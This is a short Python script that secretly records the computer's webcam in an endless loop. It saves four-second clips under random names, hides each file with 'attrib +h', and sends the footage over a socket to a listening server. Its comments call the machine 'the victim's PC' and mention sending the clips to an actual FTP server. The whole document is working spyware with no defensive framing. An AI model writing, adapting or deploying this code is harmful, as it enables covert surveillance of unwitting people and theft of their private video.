import numpy as np
import cv2
import time
import pickle
import struct
import sys
import socket
from time import sleep
import socket
import string
import random
import os

HOST='127.0.0.1'
PORT=49999


'''
in case you want to send it to an actual FTP server, verify if there is internet on this PC
def is_connected(): #verify if there is internet on the victim's PC
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False
'''
	
while(True):
	now = time.time() 

	future = now + 4 
	plus = []

	temp = "output".join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))+".mp4" 
	
	
	fourcc = cv2.VideoWriter_fourcc(*'DIVX')
	
	

	out = cv2.VideoWriter(temp,fourcc, 15.0, (640,480))
	os.system("attrib +h " + temp) #file will be created as a hidden file

	cap = cv2.VideoCapture(0) 

	while(time.time()<future ):
		
		ret, frame = cap.read()
		
		
		if ret==True:
			
		
			out.write(frame)
		   
		else:
			pass

		

	cap.release()

	out.release()
	
	#send to "server"
	
	wait = True
	
	while(wait == True):
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

			s.connect((HOST,PORT))
			f = open (temp, "rb")
			l = f.read(4096)
			while (l):
				s.send(l)
				l = f.read(4096)
			f.close()
			s.close()
			wait = False
		except:
			print("Connection with server cannot be established")
		

	